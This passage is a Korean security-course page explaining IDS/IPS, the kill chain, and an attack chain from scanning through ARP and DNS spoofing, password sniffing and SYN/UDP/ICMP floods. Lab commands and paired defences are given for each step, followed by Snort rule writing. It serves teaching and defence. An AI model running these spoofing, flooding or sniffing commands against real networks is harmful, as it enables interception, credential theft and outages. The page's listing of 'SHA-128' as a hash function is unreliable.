@@ -1,0 +1,503 @@
+<h2>해킹과 보안 — 공격 기법과 탐지·방어 이론</h2>
+
+<p>이 단원은 네트워크·웹 해킹의 대표적인 공격 기법과, 이를 탐지·차단하는 방어 체계(IDS/IPS, 방화벽), 그리고 암호화와 인터넷/웹의 기초 개념을 함께 정리합니다. 실제 손을 움직여 공격·방어 도구를 다뤄보는 실습(격리된 컨테이너 네트워크 기반)은 별도의 실습 단원에서 다루며, 여기서는 그 실습이 어떤 원리로 동작하는지 이해하기 위한 이론에 집중합니다.</p>
+
+<blockquote>아래 명령어 예시는 격리된 사설 네트워크(172.20.0.0/24) 실습 환경을 기준으로 한 것입니다. 사전 동의 없이 실제 네트워크·시스템을 대상으로 스캔, 스푸핑, 트래픽 유발 등을 수행하는 것은 위법 행위이며, 여기서는 원리를 이해하기 위한 참고용으로만 다룹니다.</blockquote>
+
+<h3>침입 탐지·방지 시스템(IDS/IPS)</h3>
+
+<h4>IDS(Intrusion Detection System, 침입 탐지 시스템)</h4>
+<ul>
+  <li>트래픽을 수동적으로 복사해 감시하며, 공격을 발견하면 관리자에게 <strong>경고(Alert)</strong>만 보냄</li>
+  <li>직접 패킷을 막지 않으므로 네트워크 속도에 영향을 주지 않지만, 사람이 직접 조치해야 함</li>
+</ul>
+
+<h4>IPS(Intrusion Prevention System, 침입 방지 시스템)</h4>
+<ul>
+  <li>트래픽이 지나가는 길목에 직접 위치하여 모든 데이터를 실시간으로 검사</li>
+  <li>악성 공격을 발견하면 <strong>즉시 차단(Drop)</strong>하거나 연결을 끊어 피해를 막음</li>
+</ul>
+
+<h4>IDS vs IPS 비교</h4>
+<table>
+  <tr><th>구분</th><th>IDS(침입 탐지 시스템)</th><th>IPS(침입 차단 시스템)</th></tr>
+  <tr><td>위치</td><td>네트워크 내부 또는 개별 호스트</td><td>네트워크 경계 또는 내부</td></tr>
+  <tr><td>작동 방식</td><td>패킷을 분석하여 의심스러운 활동을 탐지</td><td>패킷을 분석하고 위험한 트래픽을 차단</td></tr>
+  <tr><td>성능 영향</td><td>비교적 낮음(탐지만 수행)</td><td>상대적으로 높음(차단 수행)</td></tr>
+  <tr><td>운영 방식</td><td>관리자 개입 필요(경고 후 조치)</td><td>자동으로 위협을 차단</td></tr>
+  <tr><td>비유</td><td>보안 카메라</td><td>경비원</td></tr>
+</table>
+<p>당연히 IPS가 성능이 더 좋고 더 비싸다.</p>
+
+<h4>IPS 구축 방식</h4>
+<ol>
+  <li>
+    <strong>인라인(Inline) 구성</strong>
+    <ul>
+      <li>가장 표준적이고 널리 쓰이는 IPS 구축 방식</li>
+      <li>네트워크 스위치와 방화벽, 혹은 라우터 사이의 실제 트래픽 경로에 IPS를 직렬로 연결</li>
+      <li>장점: 모든 트래픽이 IPS를 통과하므로 악성 패킷 발견 즉시 실시간 차단 가능</li>
+      <li>단점: IPS 장비 자체에 장애가 발생하면 전체 네트워크가 마비(Single Point of Failure)될 수 있음</li>
+      <li>보완책: 장비 장애·전원 차단 시 트래픽이 IPS를 거치지 않고 바로 통과하도록 물리적 하드웨어 <strong>바이패스(Bypass)</strong> 장치를 함께 구성해야 함</li>
+    </ul>
+  </li>
+  <li>
+    <strong>가상 인라인(Virtual Inline) 구성</strong>
+    <ul>
+      <li>물리적으로는 인라인이 아니지만, 논리적으로 인라인처럼 작동하게 만드는 방식</li>
+      <li>IPS 장비를 네트워크 메인 경로가 아닌 측면에 배치하고, L4 스위치나 라우터의 정책(PBR)을 이용해 트래픽을 IPS로 우회시켰다가 다시 받아옴</li>
+      <li>장점: IPS 장비에 문제가 생겨도 L4 스위치에서 우회 정책만 해제하면 되므로 전체 네트워크 마비를 쉽게 방지</li>
+      <li>단점: 주변 장비 설정이 복잡해지고, 패킷이 왔다 갔다 하면서 약간의 지연(Latency) 발생 가능</li>
+    </ul>
+  </li>
+  <li>
+    <strong>IDS 모드(패시브/미러링) 구성</strong>
+    <ul>
+      <li>차단 기능은 포기하고, 탐지만 하기 위해 IDS 형태로 IPS를 구축하는 방식</li>
+      <li>스위치에서 SPAN(Mirror) 포트를 설정하여 트래픽 복사본을 IPS로 보냄</li>
+      <li>장점: 네트워크 메인 경로를 전혀 건드리지 않으므로 서비스 중단 위험이 0%에 가까움. 신규 탐지 패턴 테스트에 유용</li>
+      <li>단점: 실시간 차단 불가능. 사후에 세션을 강제 종료하는 TCP Reset 패킷을 보낼 수는 있으나, 이미 첫 번째 공격 패킷은 통과한 뒤라 완벽한 방어가 어려움</li>
+    </ul>
+  </li>
+</ol>
+
+<h4>탐지 방식</h4>
+<ul>
+  <li><strong>시그니처 기반</strong>: 알려진 공격 패턴(플래그 조합 등)을 매칭</li>
+  <li><strong>이상(Anomaly) 탐지</strong>: 임계치 초과, 학습된 정상 패턴에서 벗어남을 감지</li>
+  <li><strong>NIDS</strong>(네트워크 기반) vs <strong>HIDS</strong>(호스트 로그 기반)</li>
+</ul>
+
+<h3>APT(Advanced Persistent Threat) 공격과 사이버 킬체인</h3>
+<p>특정 표적을 정해 오랜 기간 동안 은밀하게 침투해 정보를 빼내는 고도의 해킹 방식을 APT 공격이라 한다.</p>
+<p><strong>사이버 킬체인(Cyber Kill Chain)</strong>: 락히드 마틴이 개발한, APT의 공격 과정을 7가지 단계로 나눈 방어 프레임워크다. 하나의 단계라도 막히면 다음 단계로 넘어갈 수 없다는 의미에서 킬 "체인"이라고 부른다.</p>
+<ol>
+  <li><strong>정찰(Reconnaissance)</strong>: 공격 대상의 정보를 모으고 취약점을 찾는 단계</li>
+  <li><strong>무기화(Weaponization)</strong>: 공격을 위해 악성코드를 만드는 단계</li>
+  <li><strong>전달(Delivery)</strong>: 이메일이나 웹을 통해 악성코드를 대상에게 보내는 단계</li>
+  <li><strong>취약점 공격(Exploitation)</strong>: 시스템의 약점을 이용해 코드를 실행하는 단계</li>
+  <li><strong>설치(Installation)</strong>: 시스템에 백도어 등 지속적인 접근을 위한 도구를 심는 단계</li>
+  <li><strong>명령 및 제어(Command and Control, C2)</strong>: 외부에서 감염된 시스템을 원격으로 조종하는 단계</li>
+  <li><strong>목표 달성(Actions on Objectives)</strong>: 데이터를 훔치거나 시스템을 파괴하는 최종 단계</li>
+</ol>
+<blockquote>킬체인은 한 단계라도 막으면 전체가 끊긴다 — 방어는 계층별로 빠짐없이 이루어져야 한다.</blockquote>
+
+<h3>공격 시나리오 개요</h3>
+<p>아래는 하나의 공격이 실제로 어떻게 이어지는지를 보여주는 흐름이다. 정찰로 시작해 중간자 위치를 확보하고, 자격증명을 훔친 뒤 서비스를 마비시키는 순서로 진행된다.</p>
+<blockquote>
+  <p><strong>공격자의 이야기</strong></p>
+  <p>"먼저 어떤 서버가 있는지 스캔하고(정찰), ARP를 위조해 내가 게이트웨이인 척하면서 모든 트래픽을 가로챈다(MITM 확보). 그 다음 DNS를 속여 직원들을 가짜 로그인 페이지로 보내 비밀번호를 훔치고(자격증명 탈취), 마지막으로 대량의 패킷을 퍼부어 웹서버를 마비시킨다(서비스 마비)."</p>
+  <p>보안팀은 각 단계를 실시간 탐지하고, 방화벽·프로토콜 설정으로 차단해야 한다.</p>
+</blockquote>
+<p>진행 순서: 정찰 → ARP 스푸핑을 통한 MITM 확보 → 자격증명 탈취(DNS 스푸핑·피싱 또는 패킷 스니핑) → 서비스 마비(DDoS) → 종합 방어. 자격증명 탈취와 패킷 스니핑 단계는 반드시 ARP 스푸핑으로 MITM 위치를 먼저 확보해야 성립한다.</p>
+
+<h3>정찰 — 포트 스캐닝(Nmap)</h3>
+<h4>Nmap(Network Mapper)이란?</h4>
+<p>네트워크 발견 및 보안 감사를 위한 무료 오픈소스 도구다.</p>
+<ul>
+  <li>주요 기능: 호스트 탐지, 포트 스캔, 운영체제 및 서비스 버전 탐지</li>
+</ul>
+<blockquote>보안 도구가 공격 도구로 쓰이는 경우가 많다.</blockquote>
+
+<h4>TCP 3-way Handshake란?</h4>
+<p>통신을 시작하기 전 연결을 수립하는 3단계 절차(<code>SYN</code> → <code>SYN/ACK</code> → <code>ACK</code>)다.</p>
+
+<h4>SYN 스캔(-sS)이란?</h4>
+<p>3-way handshake를 절반만 수행하여, 연결을 완성하지 않고 포트 상태를 판별하는 스텔스 스캔이다.</p>
+<ul>
+  <li>포트 상태 판정
+    <ul>
+      <li><code>SYN/ACK</code> 응답 → Open(열림)</li>
+      <li><code>RST</code> 응답 → Closed(닫힘)</li>
+      <li>응답 없음 → Filtered(방화벽에 막힘)</li>
+    </ul>
+  </li>
+</ul>
+<blockquote>마지막에 ACK 대신 RST로 끊어 연결을 완성하지 않으므로 서버 로그에 잘 남지 않는다 — 그래서 "스텔스" 스캔이다.</blockquote>
+
+<pre><code># 호스트 발견 (Ping Sweep)
+nmap -sn -T4 172.20.0.0/24
+
+# SYN 스캔 + 서비스/OS 탐지 (전체 포트)
+nmap -sS -sV -O -p- -T4 172.20.0.20
+
+# 서비스별 상세 스크립트(NSE)
+nmap -sV --script=http-headers,http-title,http-enum -p 80 172.20.0.20
+nmap -sV --script=dns-zone-transfer,dns-nsid -p 53 172.20.0.30</code></pre>
+
+<p><strong>방어(탐지) 예시</strong> — 짧은 시간 안에 SYN만 보내고 ACK가 없는 패킷이 다수 발생하면 포트 스캔으로 의심할 수 있다.</p>
+<pre><code>tcpdump -i eth0 'tcp[tcpflags] &amp; tcp-syn != 0 and tcp[tcpflags] &amp; tcp-ack == 0' -nn</code></pre>
+
+<h3>ARP 스푸핑과 MITM</h3>
+<h4>ARP(Address Resolution Protocol)란?</h4>
+<p>같은 네트워크 안에서 IP 주소를 MAC 주소로 변환해주는 프로토콜이다.</p>
+
+<h4>MITM(중간자 공격)이란?</h4>
+<p>두 통신 대상 사이에 끼어들어 트래픽을 몰래 가로채거나 변조하는 공격이다.</p>
+
+<h4>ARP 스푸핑이란?</h4>
+<p>"내가 게이트웨이다"라는 거짓 ARP Reply를 보내 피해자의 ARP 캐시를 오염시키는 공격이다.</p>
+<ul>
+  <li>공격 성립 조건
+    <ul>
+      <li>거짓 ARP Reply로 피해자·게이트웨이 양쪽 캐시를 오염(양방향)</li>
+      <li>IP 포워딩을 활성화하여, 가로챈 트래픽을 다시 전달해 눈치채지 못하게 함</li>
+    </ul>
+  </li>
+</ul>
+<blockquote>ARP에는 인증 절차가 전혀 없어서, 요청하지 않아도 응답(Reply)을 보내면 그대로 믿어버린다.</blockquote>
+
+<pre><code># 양방향 ARP 스푸핑 (터미널 두 개 필요)
+arpspoof -i eth0 -t 172.20.0.70 172.20.0.30
+arpspoof -i eth0 -t 172.20.0.30 172.20.0.70
+
+# 대안: ettercap 단일 명령으로 양방향
+ettercap -T -q -M arp /172.20.0.30// /172.20.0.70//</code></pre>
+
+<p><strong>방어</strong> — 정상 트래픽에서는 하나의 IP에 대해 ARP Reply가 반복적으로, 서로 다른 MAC으로 오지 않는다. 이 변화를 감시하고, 중요한 상대는 아예 고정해버리는 방식으로 막는다.</p>
+<pre><code># 탐지
+tcpdump -i eth0 arp -nn
+arpwatch -i eth0 -d
+
+# 방어 — 정적 ARP 등록(IP-MAC 고정)
+arp -s 172.20.0.30 &lt;실제 MAC&gt;
+
+# 방어 — ARP 패킷 속도 제한
+arptables -A INPUT --opcode reply -m limit --limit 1/s -j ACCEPT
+arptables -A INPUT --opcode reply -j DROP</code></pre>
+
+<h3>DNS 스푸핑과 피싱</h3>
+<h4>DNS(Domain Name System)란?</h4>
+<p>도메인 이름(예: <code>www.securecorp.local</code>)을 IP 주소로 변환해주는 시스템이다.</p>
+
+<h4>DNS 스푸핑이란?</h4>
+<p>정상 DNS 서버보다 먼저 위조된 응답을 보내, 피해자를 공격자가 원하는 IP(가짜 사이트)로 유도하는 공격이다.</p>
+<ul>
+  <li>위조가 가능한 이유
+    <ul>
+      <li>DNS는 Transaction ID(16비트)로만 요청·응답을 매칭</li>
+      <li>응답에 대한 인증이 없음 → ID만 맞추고 먼저 도착하면 채택됨</li>
+    </ul>
+  </li>
+</ul>
+
+<h4>피싱(Phishing)이란?</h4>
+<p>진짜와 똑같이 생긴 가짜 사이트로 유도해 ID/PW 등 자격증명을 탈취하는 공격이다.</p>
+<ul>
+  <li>은폐 기법
+    <ul>
+      <li>자격증명 입력 즉시 저장</li>
+      <li>302 리다이렉트로 진짜 사이트로 넘겨, 피해자가 "비번 틀렸나?" 하고 넘어가게 만듦</li>
+    </ul>
+  </li>
+</ul>
+<blockquote>MITM(ARP 스푸핑)이 먼저 전제되어야 DNS 응답을 가로채 위조할 수 있다.</blockquote>
+
+<pre><code># 위조 매핑 파일을 만들어 DNS 스푸핑 실행
+echo "172.20.0.60  www.securecorp.local" &gt; /tmp/dns_hosts
+dnsspoof -i eth0 -f /tmp/dns_hosts</code></pre>
+
+<p><strong>방어</strong></p>
+<pre><code># Zone Transfer 차단
+allow-transfer { none; };
+
+# 재귀 쿼리를 사내망 대역으로만 제한
+allow-recursion { 172.20.0.0/24; };
+
+# 중요 도메인은 hosts 파일에 고정
+echo "172.20.0.20  www.securecorp.local" &gt;&gt; /etc/hosts</code></pre>
+
+<h3>DNS Zone Transfer를 통한 정보 수집</h3>
+<h4>DNS Zone Transfer(AXFR)란?</h4>
+<p>1차 DNS 서버의 전체 레코드를 2차 서버로 복제하는 기능으로, 원래는 정상 기능이다.</p>
+<ul>
+  <li>취약점이 되는 경우
+    <ul>
+      <li><code>allow-transfer { any; }</code> 설정이면 누구나 전체 레코드를 열람할 수 있음</li>
+      <li>AXFR 요청(QTYPE=252) 한 번으로 <code>admin</code>, <code>db</code>, <code>vpn</code> 등 내부 호스트명까지 노출</li>
+      <li>일반 DNS 쿼리는 UDP 53, Zone Transfer는 TCP 53을 사용</li>
+    </ul>
+  </li>
+</ul>
+<blockquote>정찰 단계에서 내부 네트워크 지도를 통째로 얻을 수 있는 심각한 정보 유출이다.</blockquote>
+
+<h3>DDoS 공격</h3>
+<h4>DDoS(Distributed Denial of Service)란?</h4>
+<p>대량의 트래픽으로 서버 자원을 고갈시켜 정상 서비스를 마비시키는 공격이다.</p>
+<ul>
+  <li>공격 유형
+    <ul>
+      <li><strong>SYN Flood(L4)</strong> — SYN만 보내고 ACK를 미전송, 반개방 연결 큐를 소진</li>
+      <li><strong>UDP Flood(L4)</strong> — 대량 UDP로 대역폭·CPU 소모</li>
+      <li><strong>ICMP Flood(L3)</strong> — 대량 ping으로 대역폭 소모</li>
+      <li><strong>Slowloris(L7)</strong> — 불완전한 HTTP 헤더를 느리게 보내 연결 슬롯을 고갈</li>
+    </ul>
+  </li>
+</ul>
+<blockquote>SYN Flood는 3-way handshake를 악용해 ACK를 안 보내는 방식으로, 적은 노력으로 서버 연결 큐를 가득 채운다.</blockquote>
+
+<pre><code>hping3 -S -i u10000 --rand-source -p 80 172.20.0.20            # SYN Flood
+hping3 --udp -i u10000 --rand-source -d 1024 -p 53 172.20.0.30 # UDP Flood
+hping3 --icmp -i u10000 --rand-source 172.20.0.20               # ICMP Flood</code></pre>
+
+<p><strong>방어</strong></p>
+<pre><code># SYN Cookie 활성화 (연결 큐에 상태를 저장하지 않고 해시로 검증)
+echo 1 &gt; /proc/sys/net/ipv4/tcp_syncookies
+
+# IP당 SYN 속도 제한
+iptables -A INPUT -p tcp --syn -m hashlimit --hashlimit-above 25/sec \
+  --hashlimit-mode srcip --hashlimit-name syn_limit -j DROP
+
+# ICMP Flood 차단
+iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 4 -j ACCEPT
+iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
+
+# Slowloris 대응 — 헤더/바디/연결 유지 타임아웃을 짧게
+client_header_timeout 5s;
+client_body_timeout 5s;
+keepalive_timeout 5s;</code></pre>
+
+<h3>패킷 스니핑</h3>
+<h4>패킷 스니핑(Sniffing)이란?</h4>
+<p>네트워크를 지나가는 패킷을 몰래 수신·분석해 내용을 훔쳐보는 도청 행위다.</p>
+<ul>
+  <li>위험한 이유
+    <ul>
+      <li>HTTP는 암호화 없이 평문으로 전송 → POST의 ID/PW가 그대로 노출</li>
+      <li>MITM 위치의 공격자는 TCP 페이로드를 그대로 읽을 수 있음</li>
+    </ul>
+  </li>
+</ul>
+<blockquote>스니퍼는 패킷을 받기만 하고 보내지 않아 탐지가 어렵다 — 근본 방어는 HTTPS/TLS 암호화다.</blockquote>
+
+<pre><code>tcpdump -i eth0 -A -s 0 'tcp port 80'
+ngrep -q -d eth0 -W byline 'password|username|login' 'tcp port 80'</code></pre>
+
+<p><strong>방어(근본 대응) — HTTPS 강제 + HSTS</strong></p>
+<pre><code>server {
+    listen 80;
+    server_name www.securecorp.local;
+    return 301 https://$host$request_uri;
+}
+server {
+    listen 443 ssl;
+    server_name www.securecorp.local;
+    ssl_certificate     /etc/nginx/ssl/server.crt;
+    ssl_certificate_key /etc/nginx/ssl/server.key;
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+}</code></pre>
+
+<h3>계층별 방어 기법 정리</h3>
+<p>각 계층의 취약점을 막는 서버 측 설정을 정리하면 다음과 같다.</p>
+<ul>
+  <li><strong>SYN Cookie</strong> — 큐에 상태를 저장하지 않고 해시로 검증(SYN Flood 방어)</li>
+  <li><strong>Rate Limiting(iptables)</strong> — 초당 패킷 수 제한</li>
+  <li><strong>정적 ARP</strong> — IP-MAC을 고정해 변조 차단</li>
+  <li><strong>DNSSEC</strong> — DNS 응답에 디지털 서명을 붙여 위조 응답을 폐기</li>
+  <li><strong>HTTPS/TLS + HSTS</strong> — 암호화로 스니핑을 무력화, 항상 HTTPS를 강제</li>
+</ul>
+
+<h3>실습 환경과 실제 기업 네트워크의 차이</h3>
+<p>격리된 실습 네트워크는 공격 기법의 원리를 눈으로 확인시키기 위해, 실제 기업 네트워크의 방어 장치들을 의도적으로 걷어낸 단순화 모델이다. 실제 환경이었다면 위에서 다룬 공격의 상당수는 훨씬 어렵거나, 애초에 그 지점까지 도달하지도 못한다.</p>
+<ul>
+  <li><strong>망 분리</strong> — 실습은 하나의 평평한(flat) 대역에 모든 장비가 있어 ARP 스푸핑 한 번으로 웹서버·DNS까지 사칭할 수 있지만, 실제 환경은 DMZ와 VLAN(서버팜/DB/사용자 구역)으로 나뉘어 있어 ARP 스푸핑은 같은 VLAN 안에서만 유효하다</li>
+  <li><strong>DB 접근 통제</strong> — 실습은 DB 포트가 대역 전체에 노출되지만, 실제 환경은 DB를 별도 VLAN + ACL로 격리해 지정된 애플리케이션 서버 외에는 접근 자체가 불가능하다</li>
+  <li><strong>초기 침투 장벽</strong> — 실습은 공격자가 처음부터 내부망에 위치하지만, 실제 환경은 경계 방화벽·NAC·802.1X 인증을 먼저 통과해야 하며 보통 피싱 메일이나 취약한 VPN 등으로 먼저 발판(foothold)을 마련해야 한다</li>
+  <li><strong>ARP 스푸핑에 대한 접근 계층 방어</strong> — DHCP 스누핑과 DAI(Dynamic ARP Inspection)를 액세스 스위치에 적용하면 위조된 ARP 응답 자체를 스위치 단에서 차단할 수 있다</li>
+  <li><strong>IDS/IPS 배치</strong> — 실습은 관제 노드가 호스트 네트워크 모드로 전체 트래픽을 자동으로 보지만, 실제 환경은 코어 스위치의 SPAN/미러 포트나 인라인 탭을 별도로 설계해야 트래픽을 볼 수 있다</li>
+</ul>
+<blockquote>즉 실습은 "공격 기법이 성공했을 때 어떤 원리로 동작하는지"를 보여주기 위해 방어 계층을 걷어낸 축소 모형이다. 실제 침투테스트/레드팀 훈련에서는 이런 방어 계층(VLAN 분리, DAI, ACL, IDS 배치, 경계 방화벽)을 얼마나 잘 뚫거나 우회하느냐가 훨씬 더 큰 비중을 차지한다.</blockquote>
+
+<h3>Snort — 오픈소스 IDS/IPS</h3>
+<p>네트워크상의 실시간 트래픽 분석 및 패킷 로깅을 수행할 수 있는 오픈소스 네트워크 침입 탐지 시스템이다. 전 세계적으로 가장 널리 쓰이는 오픈소스 IDS/IPS이며, 1998년 개발되어 사실상 업계 표준(De facto standard)으로 자리 잡았다. 수많은 방화벽과 보안 솔루션이 Snort 기반 룰셋을 공유한다.</p>
+<blockquote>실질적으로 IPS 자체를 구축할 일은 많지 않고, 이미 구축된 장비에 룰셋(Ruleset)만 추가하는 업무를 하게 되는 경우가 많다.</blockquote>
+
+<h4>하나의 도구, 세 가지 역할</h4>
+<p>Snort는 상황에 따라 세 가지 역할을 한다. 패킷을 그냥 들여다보는 <strong>패킷 스니퍼</strong>, 그 패킷을 파일로 저장하는 <strong>패킷 로거</strong>, 미리 정의한 규칙(rule)에 걸리는 패킷이 있으면 경고를 띄우는 <strong>침입탐지엔진(NIDS)</strong>. 실습에서 대부분 다루는 것은 세 번째, 즉 "룰을 만들고 그 룰에 걸리는지 확인하는" 용도다.</p>
+
+<h4>패킷 처리 흐름</h4>
+<p>패킷이 들어오면 <strong>디코더</strong>가 프로토콜별로 헤더를 해석해 정규화하고, <strong>전처리기(preprocessor)</strong>가 비정상 헤더나 조각난(fragmented) 패킷 등을 한 번 걸러내며, 그다음 <strong>탐지엔진</strong>이 룰과 패턴 매칭을 한다. 매칭되면 룰에 적힌 액션(경고, 로깅, 차단 등)이 실행된다. 이 순서를 알아두면 "왜 탐지가 안 됐는지"를 디버깅할 때 어느 단계 문제인지 감을 잡을 수 있다.</p>
+
+<h4>룰 구조 — 헤더 + 옵션</h4>
+<p>룰 하나는 다음과 같이 생겼다.</p>
+<pre><code>alert tcp any any -&gt; 192.168.1.0/24 111 (content:"|00 01 86 a5|"; msg:"mountd access"; sid:1000001; rev:1;)</code></pre>
+<p>앞의 <code>alert tcp any any -&gt; 192.168.1.0/24 111</code> 부분이 <strong>헤더</strong>, 괄호 안 <code>(...)</code>가 <strong>옵션(바디)</strong>이다.</p>
+<ul>
+  <li>헤더에는 다음이 들어간다.
+    <ul>
+      <li>액션: <code>alert</code>(경고+기록), <code>log</code>(기록만), <code>pass</code>(무시), <code>drop</code>/<code>reject</code>/<code>sdrop</code>(IPS 모드에서 차단) 등</li>
+      <li>프로토콜: <code>tcp</code>, <code>udp</code>, <code>icmp</code>, <code>ip</code></li>
+      <li>출발지 IP/포트 → 목적지 IP/포트, 그 사이 방향 연산자(<code>-&gt;</code> 단방향, <code>&lt;&gt;</code> 양방향). IP는 CIDR 표기, <code>!</code>로 제외, <code>[]</code>로 여러 개 나열 가능하며, 포트도 <code>1:1024</code>(범위), <code>:1024</code>(이하), <code>1024:</code>(이상) 식으로 쓴다.</li>
+    </ul>
+  </li>
+</ul>
+
+<h4>자주 쓰는 옵션</h4>
+<table>
+  <tr><th>옵션</th><th>설명</th></tr>
+  <tr><td><code>msg</code></td><td>설정한 rule에 따라 패킷이 탐지될 경우 표현할 메시지</td></tr>
+  <tr><td><code>content</code></td><td>패킷에서 검색할 문자 혹은 바이너리 패턴(바이너리는 <code>|90 90 90|</code>처럼 지정)</td></tr>
+  <tr><td><code>nocase</code></td><td>대소문자 구분하지 않고 <code>content</code> 검색</td></tr>
+  <tr><td><code>offset</code></td><td>검색을 시작할 byte 명시</td></tr>
+  <tr><td><code>depth</code></td><td><code>offset</code>부터 검색할 byte 명시</td></tr>
+  <tr><td><code>distance</code></td><td>최초 content 매치 이후 지정한 byte만큼 이동 후 content 탐색</td></tr>
+  <tr><td><code>within</code></td><td>최초 content 매치 이후 <code>distance</code>부터 검색할 byte 지정</td></tr>
+  <tr><td><code>sid</code> / <code>rev</code></td><td>룰 고유 번호와 버전. 로컬(커스텀) 룰은 관례상 sid를 1,000,000 이상으로 사용</td></tr>
+  <tr><td><code>classtype</code></td><td>공격 유형 분류</td></tr>
+</table>
+<p>한 룰 안의 조건들은 전부 AND로 묶이고(모두 만족해야 매칭), 여러 룰 사이는 OR로 동작한다.</p>
+
+<h4>예시 — ICMP 페이로드에 특정 문자열이 있으면 경고</h4>
+<p>"ICMP 패킷 중 데이터 영역에 <code>FOOOOO</code>라는 문자열이 포함되어 있다면 <code>ICMP DoS!</code>라는 메시지로 alert하라"는 룰은 다음과 같이 작성한다.</p>
+<pre><code>alert icmp any any -&gt; any any (msg:"ICMP DoS!"; content:"FOOOOO"; sid:1000001; rev:1;)</code></pre>
+<ul>
+  <li><code>alert icmp any any -&gt; any any</code> — 모든 출발지/목적지에서 오가는 ICMP 트래픽을 검사 대상으로 지정</li>
+  <li><code>msg:"ICMP DoS!"</code> — 룰이 매치될 때 표시할 경고 메시지</li>
+  <li><code>content:"FOOOOO"</code> — 페이로드에 해당 문자열이 포함되어 있는지 검사(기본은 대소문자 구분, 무시하려면 <code>nocase;</code> 추가)</li>
+  <li><code>sid:1000001; rev:1;</code> — 룰 고유 ID와 버전 번호(로컬 룰은 보통 1,000,000 이상, 기존 룰셋과 충돌하지 않게 조정)</li>
+</ul>
+<p>특정 ICMP 타입(예: Echo Request만)으로 좁히고 싶다면 <code>itype</code>을 추가할 수 있다.</p>
+<pre><code>alert icmp any any -&gt; any any (msg:"ICMP DoS!"; itype:8; content:"FOOOOO"; sid:1000001; rev:1;)</code></pre>
+<p><code>itype:8</code>은 Echo Request(ping)만 탐지하도록 제한한다.</p>
+
+<h4>실습 전 걸려 넘어지기 쉬운 부분</h4>
+<ul>
+  <li>문자열 옵션 안에 <code>;</code>, <code>\</code>, <code>"</code> 같은 문자를 그대로 쓰면 파서가 룰을 깨뜨리므로 이스케이프 처리가 필요하다</li>
+  <li>IP 자리에 <code>!any</code>는 쓸 수 없다(전체를 부정하면 아무것도 안 남는 논리 오류)</li>
+  <li>방향 연산자는 <code>-&gt;</code>와 <code>&lt;&gt;</code>만 지원된다</li>
+  <li>Snort 2와 Snort 3의 설정 파일 구조(<code>snort.conf</code> 방식 vs 새 문법)가 다르므로, 어떤 버전 기준 자료인지 먼저 확인해야 한다</li>
+  <li>룰은 <code>local.rules</code> 같은 별도 파일에 작성하고, <code>snort.conf</code>(또는 Snort 3의 설정)에서 그 파일을 include 하는 구조가 기본이다</li>
+</ul>
+<p>전처리기 세부 옵션, PCRE 정규식, threshold 같은 DoS 대응 옵션 등 나머지는 실습하면서 필요할 때 찾아보는 식으로 익히는 것이 효율적이다.</p>
+
+<h3>Suricata</h3>
+<p>Snort와 함께 전 세계적으로 가장 널리 쓰이는 오픈소스 네트워크 침입 탐지·방지 시스템이다.</p>
+<ul>
+  <li><strong>고성능 멀티스레딩</strong> — 설계 단계부터 멀티코어/멀티스레드 환경을 겨냥해 만들어졌으며, 코어 개수가 늘어날수록 초당 패킷 처리량(PPS)이 비약적으로 상승한다</li>
+  <li><strong>빅데이터/SIEM 친화적</strong> — 모든 탐지 로그를 구조화된 <code>eve.json</code> 파일로 뽑아낼 수 있어 ELK 스택 등 대시보드 시스템과 연동해 시각화하기 편리하다</li>
+  <li><strong>강력한 프로토콜 분석</strong> — 포트 번호와 상관없이 HTTP, DNS, TLS 등의 프로토콜을 스스로 인지하고, 트래픽 내부의 파일을 자동으로 추출·저장하는 고급 NSM(네트워크 보안 모니터링) 기능을 갖췄다</li>
+</ul>
+
+<h4>Snort vs Suricata 비교</h4>
+<table>
+  <tr><th>비교 항목</th><th>Snort</th><th>Suricata</th></tr>
+  <tr><td>개발 주체</td><td>Cisco(Sourcefire 인수)</td><td>OISF(비영리 재단)</td></tr>
+  <tr><td>아키텍처</td><td>싱글 스레드(Snort 3부터 멀티스레드 지원)</td><td>네이티브 멀티스레드</td></tr>
+  <tr><td>로그 포맷</td><td>텍스트 기반 로그(별도 파싱 필요)</td><td>EVE JSON 포맷(SIEM 연동 최적화)</td></tr>
+  <tr><td>추가 기능</td><td>시그니처 기반 중심</td><td>프로토콜 식별, HTTP 파서, 파일 추출</td></tr>
+  <tr><td>룰(Rule) 호환</td><td>오리지널 Snort 룰 사용</td><td>Snort 룰 완벽 호환 + 자체 확장 룰</td></tr>
+  <tr><td>하드웨어 가속</td><td>지원 제한적</td><td>GPU 가속 지원</td></tr>
+</table>
+
+<h3>암호화 기초 — 단방향 암호화</h3>
+<p>단방향 암호화는 암호화는 할 수 있지만 원래의 데이터로 되돌리는 <strong>복호화는 불가능</strong>한 기술이다. 해시(Hash) 함수를 사용해 데이터를 고정된 길이의 무작위 문자열로 바꾸는 방식이다.</p>
+<ul>
+  <li>대표적인 해시 함수 종류
+    <ul>
+      <li>MD5</li>
+      <li>SHA-128</li>
+      <li>SHA-256</li>
+      <li>SHA-512</li>
+    </ul>
+  </li>
+</ul>
+
+<h3>인터넷과 웹의 기초</h3>
+
+<h4>네트워크 / 인터넷 / Web 구분</h4>
+<ul>
+  <li><strong>네트워크</strong>: 컴퓨터들이 서로 연결되어 데이터를 주고받는 기본 통신망</li>
+  <li><strong>인터넷</strong>: 네트워크들이 전 세계적으로 거대하게 하나로 뭉친 하드웨어 인프라 기반망</li>
+  <li><strong>Web</strong>: 인터넷 위에서 문서와 정보를 공유하는 하나의 서비스(가장 많이 사용됨)</li>
+</ul>
+
+<h4>TCP/IP와 RFC</h4>
+<p>TCP/IP는 가장 많이 사용되는 프로토콜이며, 프로토콜에 대한 상세한 내용은 <strong>RFC(Request For Comments)</strong>라는 문서를 통해 공개된다. RFC는 국제인터넷표준화기구(IETF)에서 만들며, 인터넷에서 기술을 구현하는 데 필요한 상세 절차와 기본 틀을 제공하는 기술 관련 문서다.</p>
+
+<h4>인터넷 거버넌스</h4>
+<ul>
+  <li><strong>국제인터넷주소관리기구(ICANN)</strong> — 인터넷의 기술적인 문제를 관리하며, 유일한 식별자인 도메인 네임 시스템(DNS)과 IP 주소, 프로토콜 번호와 매개변수 배정 등을 관리한다. DNS 루트 네임 서버 시스템의 개선 및 운영도 담당한다.</li>
